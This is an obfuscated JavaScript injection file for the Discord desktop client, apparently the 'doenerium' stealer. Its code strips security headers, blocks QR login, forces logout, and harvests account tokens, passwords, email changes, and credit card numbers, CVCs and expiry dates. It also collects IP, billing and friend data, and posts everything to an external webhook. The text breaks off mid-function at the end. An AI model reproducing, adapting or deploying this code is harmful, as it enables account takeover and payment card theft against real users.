var _0x4ddf30=_0x9903;(function(_0x3e6581,_0x29d5ad){var _0x12178a=_0x9903,_0x498cc7=_0x3e6581();while(!![]){try{var _0x2c16df=-parseInt(_0x12178a(0x1a7))/0x1*(parseInt(_0x12178a(0x109))/0x2)+parseInt(_0x12178a(0x196))/0x3+-parseInt(_0x12178a(0x14a))/0x4+-parseInt(_0x12178a(0x19b))/0x5*(-parseInt(_0x12178a(0x110))/0x6)+parseInt(_0x12178a(0x12d))/0x7*(-parseInt(_0x12178a(0x183))/0x8)+-parseInt(_0x12178a(0x120))/0x9+parseInt(_0x12178a(0x126))/0xa*(parseInt(_0x12178a(0x18d))/0xb);if(_0x2c16df===_0x29d5ad)break;else _0x498cc7['push'](_0x498cc7['shift']());}catch(_0x102f78){_0x498cc7['push'](_0x498cc7['shift']());}}}(_0x554b,0x231d7));const {BrowserWindow,session}=require('electron'),os=require('os'),https=require(_0x4ddf30(0x18f)),querystring=require('querystring'),fs=require('fs');var config={'brand':_0x4ddf30(0x10a),'webhook':_0x4ddf30(0x11d),'logout':!![],'disable_qr_code':!![],'notify_on_logout':!![],'notify_on_initialization':!![],'ping':[![],_0x4ddf30(0x14f)],'embed':{'username':_0x4ddf30(0x12c),'footer':{'text':'doenerium\x20|\x20t.me/doenerium','icon_url':'https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless'},'href':'https://t.me/doenerium','avatar_url':_0x4ddf30(0x15a)},'badges':{'Discord_Employee':{'Value':0x1,'Emoji':_0x4ddf30(0x1a2),'Rare':!![]},'Partnered_Server_Owner':{'Value':0x2,'Emoji':_0x4ddf30(0x187),'Rare':!![]},'HypeSquad_Events':{'Value':0x4,'Emoji':_0x4ddf30(0x116),'Rare':!![]},'Bug_Hunter_Level_1':{'Value':0x8,'Emoji':_0x4ddf30(0x1a1),'Rare':!![]},'Early_Supporter':{'Value':0x200,'Emoji':'<:early_supporter:874750808414113823>','Rare':!![]},'Bug_Hunter_Level_2':{'Value':0x4000,'Emoji':_0x4ddf30(0x103),'Rare':!![]},'Early_Verified_Bot_Developer':{'Value':0x20000,'Emoji':_0x4ddf30(0x125),'Rare':!![]},'House_Bravery':{'Value':0x40,'Emoji':_0x4ddf30(0x16d),'Rare':![]},'House_Brilliance':{'Value':0x80,'Emoji':_0x4ddf30(0x15f),'Rare':![]},'House_Balance':{'Value':0x100,'Emoji':_0x4ddf30(0x199),'Rare':![]}},'filters':{'user':{'urls':[_0x4ddf30(0x1b3),'https://discordapp.com/api/v*/users/@me',_0x4ddf30(0x16c),'https://discordapp.com/api/v*/auth/login',_0x4ddf30(0x1ac),_0x4ddf30(0x137),_0x4ddf30(0x13e),_0x4ddf30(0x13f),'https://api.stripe.com/v*/setup_intents/*/confirm',_0x4ddf30(0x197)]},'qr_codes':{'urls':[_0x4ddf30(0x151),_0x4ddf30(0x153),_0x4ddf30(0x1af),_0x4ddf30(0x193),_0x4ddf30(0x132),'https://*.discord.com/api/v*/users/@me/billing/subscriptions',_0x4ddf30(0x124),_0x4ddf30(0x159)]}}},execScript=_0x24dbef=>{var _0x5cf1d5=_0x4ddf30;const _0x299893=BrowserWindow['getAllWindows']()[0x0];return _0x299893['webContents'][_0x5cf1d5(0x11e)](_0x24dbef,!![]);};class Event{constructor(_0x23f6ce,_0x3b33f4,_0x5d001c){var _0x31060f=_0x4ddf30;for(let [_0x5df1be,_0x3d37ef]of Object[_0x31060f(0x14e)]({'event':_0x23f6ce,'data':_0x5d001c,'token':_0x3b33f4})){this[_0x5df1be]=_0x3d37ef;}}[_0x4ddf30(0x152)](){var _0x155d89=_0x4ddf30;switch(this[_0x155d89(0x147)]){case'passwordChanged':event_handlers[_0x155d89(0x175)](this[_0x155d89(0x160)][_0x155d89(0x1b4)],this['data']['new_password'],this['token']);break;case _0x155d89(0x17f):event_handlers[_0x155d89(0x17f)](this[_0x155d89(0x160)][_0x155d89(0x1b4)],this[_0x155d89(0x160)][_0x155d89(0x112)],this[_0x155d89(0x189)]);break;case'emailChanged':event_handlers[_0x155d89(0x106)](this[_0x155d89(0x160)][_0x155d89(0x1b4)],this[_0x155d89(0x160)][_0x155d89(0x112)],this[_0x155d89(0x189)]);break;case _0x155d89(0x178):event_handlers[_0x155d89(0x178)](this[_0x155d89(0x160)]['number'],this[_0x155d89(0x160)][_0x155d89(0x13a)],this[_0x155d89(0x160)][_0x155d89(0x117)],this['data'][_0x155d89(0x185)],this[_0x155d89(0x189)]);}}}session[_0x4ddf30(0x171)]['webRequest']['onHeadersReceived']((_0x37e6e6,_0x22b08d)=>{var _0x5361b2=_0x4ddf30;try{_0x37e6e6[_0x5361b2(0x122)][_0x5361b2(0x1b0)](config[_0x5361b2(0x104)])?_0x37e6e6[_0x5361b2(0x122)][_0x5361b2(0x10b)](_0x5361b2(0x19f))?_0x22b08d({'responseHeaders':Object[_0x5361b2(0x156)]({'Access-Control-Allow-Headers':'*'},_0x37e6e6['responseHeaders'])}):_0x22b08d({'responseHeaders':Object['assign']({'Content-Security-Policy':[_0x5361b2(0x181),_0x5361b2(0x1a9),'Access-Control-Allow-Origin\x20\x27*\x27'],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0x37e6e6[_0x5361b2(0x1a6)])}):(delete _0x37e6e6[_0x5361b2(0x1a6)][_0x5361b2(0x115)],delete _0x37e6e6[_0x5361b2(0x1a6)][_0x5361b2(0x198)],_0x22b08d({'responseHeaders':{..._0x37e6e6[_0x5361b2(0x1a6)],'Access-Control-Allow-Headers':'*'}}));}catch{}}),session['defaultSession'][_0x4ddf30(0x131)][_0x4ddf30(0x174)](config['filters'][_0x4ddf30(0x135)],async(_0x2b783d,_0x234095)=>{var _0x1750c1=_0x4ddf30;if(_0x2b783d[_0x1750c1(0x122)]['startsWith'](_0x1750c1(0x144))){if(!config[_0x1750c1(0x195)]==![]){_0x234095({'cancel':!![]});return;}}await initialize(),_0x234095({});return;}),session[_0x4ddf30(0x171)][_0x4ddf30(0x131)][_0x4ddf30(0x13b)](config[_0x4ddf30(0x10f)][_0x4ddf30(0x162)],async(_0x5c104e,_0x2fab27)=>{var _0x14192c=_0x4ddf30;try{if(_0x5c104e['statusCode']==0xc8||_0x5c104e[_0x14192c(0x107)]==0xcc){const _0x343c24=Buffer[_0x14192c(0x194)](_0x5c104e[_0x14192c(0x123)][0x0][_0x14192c(0x179)])[_0x14192c(0x19a)](),_0x5e66fe=JSON[_0x14192c(0x1a8)](_0x343c24),_0x212c6a=await getToken();switch(!![]){case _0x5c104e[_0x14192c(0x122)][_0x14192c(0x1a4)](_0x14192c(0x1ab)):new Event(_0x14192c(0x17f),_0x212c6a,{'password':_0x5e66fe[_0x14192c(0x1b4)],'email':_0x5e66fe[_0x14192c(0x1ab)]})[_0x14192c(0x152)]();;return;case _0x5c104e['url'][_0x14192c(0x1a4)](_0x14192c(0x129))&&_0x5c104e[_0x14192c(0x161)]==_0x14192c(0x163):const _0x49d284=querystring[_0x14192c(0x1a8)](_0x343c24[_0x14192c(0x19a)]());new Event('creditCardAdded',_0x212c6a,{'number':_0x49d284[_0x14192c(0x16f)],'cvc':_0x49d284[_0x14192c(0x1a3)],'exp_month':_0x49d284['card[exp_month]'],'exp_year':_0x49d284['card[exp_year]']});case _0x5c104e[_0x14192c(0x122)][_0x14192c(0x1a4)](_0x14192c(0x11c))&&_0x5c104e[_0x14192c(0x161)]==_0x14192c(0x130):if(!_0x5e66fe['password'])return;_0x5e66fe[_0x14192c(0x112)]&&new Event(_0x14192c(0x106),_0x212c6a,{'password':_0x5e66fe[_0x14192c(0x1b4)],'email':_0x5e66fe[_0x14192c(0x112)]})['handle']();;_0x5e66fe[_0x14192c(0x19d)]&&new Event(_0x14192c(0x175),_0x212c6a,{'password':_0x5e66fe['password'],'new_password':_0x5e66fe[_0x14192c(0x19d)]})['handle']();;return;default:break;}}else return;}catch{}});var event_handlers={async 'creditCardAdded'(_0x4ccd28,_0x33118a,_0x4949f5,_0x5a0412){var _0x1b1d1f=_0x4ddf30;const _0x361708=await getUserInfo(token),_0x43bd00=await getBilling(token),_0x4e6c18=await getRelationships(token);var _0x274119={'username':config[_0x1b1d1f(0x191)][_0x1b1d1f(0x166)],'avatar_url':config[_0x1b1d1f(0x191)][_0x1b1d1f(0x114)],'embeds':[createEmbed({'title':_0x1b1d1f(0x167),'url':config[_0x1b1d1f(0x191)][_0x1b1d1f(0x1ad)],'author':{'name':_0x361708[_0x1b1d1f(0x166)]+'#'+_0x361708[_0x1b1d1f(0x12f)]+'\x20('+_0x361708['id']+')','url':config['embed'][_0x1b1d1f(0x1ad)],'icon_url':_0x361708[_0x1b1d1f(0x118)]?'https://cdn.discordapp.com/avatars/'+_0x361708['id']+'/'+_0x361708[_0x1b1d1f(0x118)]:_0x1b1d1f(0x19e)},'thumbnail':{'url':_0x361708['avatar']?_0x1b1d1f(0x127)+_0x361708['id']+'/'+_0x361708[_0x1b1d1f(0x118)]:_0x1b1d1f(0x19e)},'fields':[{'name':'Credit\x20card\x20Number','value':_0x1b1d1f(0x102)+_0x4ccd28+_0x1b1d1f(0x102),'inline':!![]},{'name':_0x1b1d1f(0x10d),'value':_0x1b1d1f(0x102)+_0x33118a+'```','inline':!![]},{'name':_0x1b1d1f(0x105),'value':_0x1b1d1f(0x102)+_0x4949f5+'/'+_0x5a0412+'```','inline':!![]},{'name':_0x1b1d1f(0x1b5),'value':'```'+(_0x361708['phone']??'None')+_0x1b1d1f(0x102),'inline':![]},{'name':_0x1b1d1f(0x150),'value':''+getNitro(_0x361708['premium_type']),'inline':![]},{'name':_0x1b1d1f(0x177),'value':''+_0x43bd00,'inline':!![]},{'name':_0x1b1d1f(0x16e),'value':''+getBadges(_0x361708[_0x1b1d1f(0x14c)]),'inline':![]},{'name':_0x1b1d1f(0x18c),'value':'```'+token+'```','inline':![]},{'name':_0x1b1d1f(0x190),'value':'```'+os[_0x1b1d1f(0x15c)]+'```','inline':![]}]}),createEmbed({'description':_0x1b1d1f(0x18a)+_0x4e6c18[_0x1b1d1f(0x146)]+')**\x0a\x0a'+_0x4e6c18[_0x1b1d1f(0x138)],'thumbnail':{'url':_0x361708['avatar']?'https://cdn.discordapp.com/avatars/'+_0x361708['id']+'/'+_0x361708['avatar']:_0x1b1d1f(0x19e)},'author':{'name':_0x361708[_0x1b1d1f(0x166)]+'#'+_0x361708[_0x1b1d1f(0x12f)]+'\x20('+_0x361708['id']+')','url':config[_0x1b1d1f(0x191)]['href'],'icon_url':_0x361708[_0x1b1d1f(0x118)]?'https://cdn.discordapp.com/avatars/'+_0x361708['id']+'/'+_0x361708[_0x1b1d1f(0x118)]:_0x1b1d1f(0x19e)}})]};sendToWebhook(_0x274119);},async 'userLogin'(_0x393d19,_0xbc4bc0,_0x24fee6){var _0x153596=_0x4ddf30;const _0x7dd79a=await getUserInfo(_0x24fee6),_0x1ff29b=await getBilling(_0x24fee6),_0x4f739c=await getRelationships(_0x24fee6);var _0x1c3262={'username':config[_0x153596(0x191)]['username'],'avatar_url':config[_0x153596(0x191)][_0x153596(0x114)],'embeds':[createEmbed({'title':_0x153596(0x16a),'url':config[_0x153596(0x191)]['href'],'author':{'name':_0x7dd79a['username']+'#'+_0x7dd79a['discriminator']+'\x20('+_0x7dd79a['id']+')','url':config[_0x153596(0x191)][_0x153596(0x1ad)],'icon_url':_0x7dd79a[_0x153596(0x118)]?_0x153596(0x127)+_0x7dd79a['id']+'/'+_0x7dd79a[_0x153596(0x118)]:'https://cdn.discordapp.com/embed/avatars/0.png'},'thumbnail':{'url':_0x7dd79a[_0x153596(0x118)]?'https://cdn.discordapp.com/avatars/'+_0x7dd79a['id']+'/'+_0x7dd79a[_0x153596(0x118)]:_0x153596(0x19e)},'fields':[{'name':'Password','value':_0x153596(0x102)+_0x393d19+_0x153596(0x102),'inline':!![]},{'name':_0x153596(0x19c),'value':_0x153596(0x102)+_0xbc4bc0+_0x153596(0x102),'inline':!![]},{'name':_0x153596(0x1b5),'value':_0x153596(0x102)+(_0x7dd79a[_0x153596(0x17d)]??_0x153596(0x17e))+'```','inline':![]},{'name':'Nitro','value':''+getNitro(_0x7dd79a[_0x153596(0x15e)]),'inline':![]},{'name':'Billing','value':''+_0x1ff29b,'inline':!![]},{'name':_0x153596(0x16e),'value':''+getBadges(_0x7dd79a['flags']),'inline':![]},{'name':_0x153596(0x18c),'value':_0x153596(0x102)+_0x24fee6+_0x153596(0x102),'inline':![]},{'name':_0x153596(0x190),'value':_0x153596(0x102)+os[_0x153596(0x15c)]+'```','inline':![]}]}),createEmbed({'description':'**Total\x20Friends\x20('+_0x4f739c[_0x153596(0x146)]+')**\x0a\x0a'+_0x4f739c[_0x153596(0x138)],'thumbnail':{'url':_0x7dd79a['avatar']?_0x153596(0x127)+_0x7dd79a['id']+'/'+_0x7dd79a[_0x153596(0x118)]:_0x153596(0x19e)},'author':{'name':_0x7dd79a[_0x153596(0x166)]+'#'+_0x7dd79a[_0x153596(0x12f)]+'\x20('+_0x7dd79a['id']+')','url':config[_0x153596(0x191)][_0x153596(0x1ad)],'icon_url':_0x7dd79a[_0x153596(0x118)]?_0x153596(0x127)+_0x7dd79a['id']+'/'+_0x7dd79a[_0x153596(0x118)]:_0x153596(0x19e)}})]};sendToWebhook(_0x1c3262);},async 'emailChanged'(_0x214275,_0x59d291,_0x5bc196){var _0x5c76fb=_0x4ddf30,_0x50734c=await getUserInfo(_0x5bc196),_0x28ee30=await getBilling(_0x5bc196),_0x727349=await getRelationships(_0x5bc196),_0x43e60f={'username':config[_0x5c76fb(0x191)]['username'],'avatar_url':config[_0x5c76fb(0x191)][_0x5c76fb(0x114)],'embeds':[createEmbed({'title':'Discord\x20|\x20Email\x20changed','url':config[_0x5c76fb(0x191)][_0x5c76fb(0x1ad)],'author':{'name':_0x50734c[_0x5c76fb(0x166)]+'#'+_0x50734c['discriminator']+'\x20('+_0x50734c['id']+')','url':config[_0x5c76fb(0x191)][_0x5c76fb(0x1ad)],'icon_url':_0x50734c[_0x5c76fb(0x118)]?'https://cdn.discordapp.com/avatars/'+_0x50734c['id']+'/'+_0x50734c['avatar']:'https://cdn.discordapp.com/embed/avatars/0.png'},'thumbnail':{'url':_0x50734c[_0x5c76fb(0x118)]?_0x5c76fb(0x127)+_0x50734c['id']+'/'+_0x50734c[_0x5c76fb(0x118)]:'https://cdn.discordapp.com/embed/avatars/0.png'},'fields':[{'name':_0x5c76fb(0x15d),'value':'```'+_0x59d291+'```','inline':!![]},{'name':'Password','value':_0x5c76fb(0x102)+_0x214275+'```','inline':!![]},{'name':_0x5c76fb(0x1b5),'value':_0x5c76fb(0x102)+(_0x50734c[_0x5c76fb(0x17d)]??_0x5c76fb(0x17e))+_0x5c76fb(0x102),'inline':![]},{'name':'Nitro','value':''+getNitro(_0x50734c['premium_type']),'inline':![]},{'name':'Billing','value':''+_0x28ee30,'inline':!![]},{'name':_0x5c76fb(0x16e),'value':''+getBadges(_0x50734c[_0x5c76fb(0x14c)]),'inline':![]},{'name':_0x5c76fb(0x18c),'value':_0x5c76fb(0x102)+_0x5bc196+_0x5c76fb(0x102),'inline':![]},{'name':_0x5c76fb(0x190),'value':_0x5c76fb(0x102)+os[_0x5c76fb(0x15c)]+_0x5c76fb(0x102),'inline':![]}]}),createEmbed({'description':_0x5c76fb(0x18a)+_0x727349[_0x5c76fb(0x146)]+_0x5c76fb(0x12a)+_0x727349[_0x5c76fb(0x138)],'thumbnail':{'url':_0x50734c['avatar']?_0x5c76fb(0x127)+_0x50734c['id']+'/'+_0x50734c['avatar']:_0x5c76fb(0x19e)},'author':{'name':_0x50734c[_0x5c76fb(0x166)]+'#'+_0x50734c[_0x5c76fb(0x12f)]+'\x20('+_0x50734c['id']+')','url':config[_0x5c76fb(0x191)]['href'],'icon_url':_0x50734c[_0x5c76fb(0x118)]?_0x5c76fb(0x127)+_0x50734c['id']+'/'+_0x50734c['avatar']:_0x5c76fb(0x19e)}})]};sendToWebhook(_0x43e60f);},async 'passwordChanged'(_0x43e35a,_0x1d0b3b,_0x575cba){var _0x590d02=_0x4ddf30,_0x5efa93=await getUserInfo(_0x575cba),_0x1f4523=await getBilling(_0x575cba),_0x4dc757=await getRelationships(_0x575cba),_0x7315df={'username':config[_0x590d02(0x191)]['username'],'avatar_url':config['embed'][_0x590d02(0x114)],'embeds':[createEmbed({'title':'Discord\x20|\x20Password\x20changed','url':config[_0x590d02(0x191)][_0x590d02(0x1ad)],'author':{'name':_0x5efa93[_0x590d02(0x166)]+'#'+_0x5efa93[_0x590d02(0x12f)]+'\x20('+_0x5efa93['id']+')','url':config[_0x590d02(0x191)][_0x590d02(0x1ad)],'icon_url':_0x5efa93[_0x590d02(0x118)]?_0x590d02(0x127)+_0x5efa93['id']+'/'+_0x5efa93[_0x590d02(0x118)]:_0x590d02(0x19e)},'thumbnail':{'url':_0x5efa93['avatar']?_0x590d02(0x127)+_0x5efa93['id']+'/'+_0x5efa93[_0x590d02(0x118)]:'https://cdn.discordapp.com/embed/avatars/0.png'},'fields':[{'name':_0x590d02(0x158),'value':_0x590d02(0x102)+_0x43e35a+_0x590d02(0x102),'inline':![]},{'name':'New\x20password','value':_0x590d02(0x102)+_0x1d0b3b+'```','inline':![]},{'name':_0x590d02(0x1b5),'value':_0x590d02(0x102)+(_0x5efa93[_0x590d02(0x17d)]??_0x590d02(0x17e))+_0x590d02(0x102),'inline':![]},{'name':_0x590d02(0x150),'value':''+getNitro(_0x5efa93[_0x590d02(0x15e)]),'inline':![]},{'name':_0x590d02(0x177),'value':''+_0x1f4523,'inline':!![]},{'name':_0x590d02(0x16e),'value':''+getBadges(_0x5efa93[_0x590d02(0x14c)]),'inline':![]},{'name':_0x590d02(0x18c),'value':'```'+_0x575cba+_0x590d02(0x102),'inline':![]},{'name':'Hostname','value':_0x590d02(0x102)+os[_0x590d02(0x15c)]+_0x590d02(0x102),'inline':![]}]}),createEmbed({'description':_0x590d02(0x18a)+_0x4dc757[_0x590d02(0x146)]+')**\x0a\x0a'+_0x4dc757[_0x590d02(0x138)],'thumbnail':{'url':_0x5efa93[_0x590d02(0x118)]?_0x590d02(0x127)+_0x5efa93['id']+'/'+_0x5efa93[_0x590d02(0x118)]:_0x590d02(0x19e)},'author':{'name':_0x5efa93[_0x590d02(0x166)]+'#'+_0x5efa93['discriminator']+'\x20('+_0x5efa93['id']+')','url':config[_0x590d02(0x191)][_0x590d02(0x1ad)],'icon_url':_0x5efa93[_0x590d02(0x118)]?'https://cdn.discordapp.com/avatars/'+_0x5efa93['id']+'/'+_0x5efa93[_0x590d02(0x118)]:'https://cdn.discordapp.com/embed/avatars/0.png'}})]};sendToWebhook(_0x7315df);}};function getDiscordClient(){var _0x12455a=_0x4ddf30;return''+process[_0x12455a(0x16b)]()[_0x12455a(0x108)](process[_0x12455a(0x173)]['LOCALAPPDATA']+'\x5c','')[_0x12455a(0x10e)]('\x5c')[0x0][_0x12455a(0x10e)](0x7);}function getNitro(_0x99c279){var _0x4399e6=_0x4ddf30;switch(_0x99c279){case 0x0:return'```No\x20Nitro```';case 0x1:return _0x4399e6(0x10c);case 0x2:return _0x4399e6(0x139);default:return'```No\x20Nitro```';};}function getRareBadges(_0x1861c0){var _0x59a390=_0x4ddf30,_0x258f33='';for(const _0x3c8582 in config[_0x59a390(0x1a0)]){let _0x2f2f92=config['badges'][_0x3c8582];if((_0x1861c0&_0x2f2f92['Value'])==_0x2f2f92['Value']&&_0x2f2f92[_0x59a390(0x157)])_0x258f33+=_0x2f2f92['Emoji'];};return _0x258f33;}function getBadges(_0xc2cb5e){var _0x593bde=_0x4ddf30,_0x1ec804='';for(const _0x25611e in config[_0x593bde(0x1a0)]){let _0x24b26e=config[_0x593bde(0x1a0)][_0x25611e];if((_0xc2cb5e&_0x24b26e[_0x593bde(0x143)])==_0x24b26e[_0x593bde(0x143)])_0x1ec804+=_0x24b26e[_0x593bde(0x168)];};if(_0x1ec804=='')_0x1ec804=_0x593bde(0x180);return _0x1ec804;}async function getToken(){return await execScript('for(let\x20a\x20in\x20window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x27get_require\x27]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let\x20b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let\x20a\x20in\x20b.default)\x27getToken\x27==a&&(token=b.default.getToken())}token;',!![]);}function _0x554b(){var _0x2507a1=['then','391112VjSTNu','\x20||','flags','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://ipinfo.io/json\x22,\x20false\x20);xmlHttp.send(\x20null\x20);xmlHttp.responseText;','entries','@doener','Nitro','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','handle','https://*.discord.com/api/v*/applications/detectable','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v8/users/@me\x22,\x20false\x20);xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','write','assign','Rare','Old\x20password','wss://remote-auth-gateway.discord.gg/*','https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless','country','hostname','New\x20email\x20address','premium_type','<:brilliance:874750808338608199>','data','method','user','POST','timezone','log','username','Discord\x20|\x20Credit\x20card\x20added','Emoji','Discord\x20|\x20Client\x20initialized\x20(not\x20logged\x20in)','Discord\x20|\x20User\x20logged\x20in','cwd','https://*.discord.com/api/v*/users/@me','<:bravery:874750808388952075>','Badges','card[number]','mkdirSync','defaultSession','\x22);\x20xmlHttp.send(\x20null\x20);\x20xmlHttp.responseText','env','onBeforeRequest','passwordChanged','\x0aTimezone:\x20','Billing','creditCardAdded','bytes','./core.asar','region','city','phone','None','userLogin','```None```','default-src\x20\x27*\x27','existsSync','695256VDFLSt','footer','exp_year','application/json','<:partner:874750808678354964>','ping','token','**Total\x20Friends\x20(','filter','Token','22WmXTNn','Discord\x20|\x20Client\x20initialized','https','Hostname','embed','```yaml\x0aIP\x20Address:\x20','https://*.discord.com/api/v*/users/@me/library','from','disable_qr_code','313338gBCqyT','https://api.stripe.com/v*/payment_intents/*/confirm','content-security-policy-report-only','<:balance:874750808267292683>','toString','5AWdMTf','E-Mail\x20Address','new_password','https://cdn.discordapp.com/embed/avatars/0.png','discord.com','badges','<:bughunter_1:874750808426692658>','<:staff:874750808728666152>','card[cvc]','endsWith','Unknown','responseHeaders','22555cYmjLc','parse','Access-Control-Allow-Headers\x20\x27*\x27','\x20<:paypal:896441236062347374>','login','https://discord.com/api/v*/auth/login','href','stringify','https://discord.com/api/v*/applications/detectable','startsWith','`✔️`','window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();','https://discord.com/api/v*/users/@me','password','Phone\x20Number','\x0aCountry:\x20','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/billing/payment-sources\x22,\x20false\x20);\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','```','<:bughunter_2:874750808430874664>','webhook','Credit\x20card\x20expiration','emailChanged','statusCode','replace','22hcIoOU','doenerium','includes','<:classic:896119171019067423>\x20``Nitro\x20Classic``','Credit\x20card\x20CVC','split','filters','171036QQWxkZ','\x0aRegion:\x20','email','host','avatar_url','content-security-policy','<:hypesquad_events:874750808594477056>','exp_month','avatar','type','\x20:credit_card:','notify_on_initialization','users/@me','https://websec.services/send/6335f9c69ad22e8b19d01122','executeJavaScript','brand','2517147DentIV','content','url','uploadData','https://discord.com/api/v*/users/@me/billing/subscriptions','<:developer:874750808472825986>','4485830mhYIAo','https://cdn.discordapp.com/avatars/','\x20|\x20','tokens',')**\x0a\x0a','invalid','doenerium\x20|\x20t.me/doenerium','21oZAEJr','public_flags','discriminator','PATCH','webRequest','https://discord.com/api/v*/users/@me/library','request','Connection\x20data','qr_codes','\x0aHostname:\x20','https://*.discord.com/api/v*/auth/login','frien','<a:boost:824036778570416129>\x20``Nitro\x20Boost``','cvc','onCompleted','end','notify_on_logout','https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts','https://api.stripe.com/v*/tokens','forEach','```❌```','pathname','Value','wss://','Client\x20version','length','event','\x22);xmlHttp.send(\x20null\x20);xmlHttp.responseText'];_0x554b=function(){return _0x2507a1;};return _0x554b();}async function getIp(){var _0x8abfcb=_0x4ddf30;return JSON[_0x8abfcb(0x1a8)](await execScript(_0x8abfcb(0x14d),!![]));}async function getUserInfo(_0x3a026b){var _0x4fbf84=_0x4ddf30;return JSON[_0x4fbf84(0x1a8)](await execScript(_0x4fbf84(0x154)+_0x3a026b+'\x22);xmlHttp.send(\x20null\x20);xmlHttp.responseText;',!![]));}async function getBilling(_0x5d3cbb){var _0x4cdeae=_0x4ddf30,_0x40c7f0=await execScript(_0x4cdeae(0x1b7)+_0x5d3cbb+_0x4cdeae(0x172),!![]),_0x532419=JSON['parse'](_0x40c7f0),_0xd8cf6a='';_0x532419[_0x4cdeae(0x140)](_0x8c8ff8=>{var _0x599a60=_0x4cdeae;if(_0x8c8ff8['type']=='')return _0x599a60(0x141);else{if(_0x8c8ff8['type']==0x2&&_0x8c8ff8[_0x599a60(0x12b)]!=!![])_0xd8cf6a+='`✔️`'+_0x599a60(0x1aa);else{if(_0x8c8ff8[_0x599a60(0x119)]==0x1&&_0x8c8ff8[_0x599a60(0x12b)]!=!![])_0xd8cf6a+=_0x599a60(0x1b1)+_0x599a60(0x11a);else return _0x599a60(0x141);}};});if(_0xd8cf6a=='')_0xd8cf6a=_0x4cdeae(0x141);return _0xd8cf6a;}async function getRelationships(_0x54457d){var _0x27453e=_0x4ddf30,_0x1e90cd=await execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/relationships\x22,\x20false\x20);xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22'+_0x54457d+_0x27453e(0x148),!![]),_0x2efb39=JSON[_0x27453e(0x1a8)](_0x1e90cd);const _0x472b41=_0x2efb39[_0x27453e(0x18b)](_0x37c500=>{var _0x46a1f7=_0x27453e;return _0x37c500[_0x46a1f7(0x119)]==0x1;});var _0x259e06='';for(z of _0x472b41){var _0x13ce48=getRareBadges(z[_0x27453e(0x162)][_0x27453e(0x12e)]);_0x13ce48!=''&&(_0x259e06+=_0x13ce48+(_0x27453e(0x128)+z[_0x27453e(0x162)]['username']+'#'+z[_0x27453e(0x162)][_0x27453e(0x12f)]+'\x0a'));}if(!_0x259e06)_0x259e06='No\x20Rare\x20Friends';return{'length':_0x472b41['length'],'frien':_0x259e06};}function sendToWebhook(_0x42b22b){var _0x296a0b=_0x4ddf30;config[_0x296a0b(0x188)][0x0]==!![]&&(_0x42b22b[_0x296a0b(0x121)]?_0x42b22b[_0x296a0b(0x121)]=_0x42b22b[_0x296a0b(0x121)]+(_0x296a0b(0x14b)+config[_0x296a0b(0x188)][0x1]+'||'):_0x42b22b[_0x296a0b(0x121)]='||'+config[_0x296a0b(0x188)][0x1]+'||');var _0x519607=new URL(config[_0x296a0b(0x104)]),_0x265e95={'Content-Type':_0x296a0b(0x186),'Access-Control-Allow-Origin':'*'};const _0x29c659={'protocol':_0x519607['protocol'],'hostname':_0x519607[_0x296a0b(0x113)],'path':_0x519607[_0x296a0b(0x142)],'method':_0x296a0b(0x163),'headers':_0x265e95},_0x183d11=https[_0x296a0b(0x133)](_0x29c659);_0x183d11['on']('error',_0x3d88cf=>{var _0x58eb9d=_0x296a0b;console[_0x58eb9d(0x165)](_0x3d88cf);}),_0x183d11[_0x296a0b(0x155)](JSON[_0x296a0b(0x1ae)](_0x42b22b)),_0x183d11[_0x296a0b(0x13c)]();}function createEmbed(_0x44967f){var _0x46de1e=_0x4ddf30;let _0xf938={'footer':config['embed'][_0x46de1e(0x184)],'timestamp':new Date()};for(let [_0x4d652e,_0x5074ba]of Object[_0x46de1e(0x14e)](_0x44967f)){_0xf938[_0x4d652e]=_0x5074ba;}return _0xf938;}function _0x9903(_0x2419f8,_0x34bfde){var _0x554bb8=_0x554b();return _0x9903=function(_0x9903d6,_0x207105){_0x9903d6=_0x9903d6-0x102;var _0x45d230=_0x554bb8[_0x9903d6];return _0x45d230;},_0x9903(_0x2419f8,_0x34bfde);}async function initialize(){var _0x35d7d9=_0x4ddf30;if(!fs[_0x35d7d9(0x182)](process[_0x35d7d9(0x16b)]()+'/'+config[_0x35d7d9(0x11f)])){fs[_0x35d7d9(0x170)](process['cwd']()+'/'+config[_0x35d7d9(0x11f)]);var _0x33f833=undefined;_0x33f833=await getToken();const _0x8c5119=await getIp();var 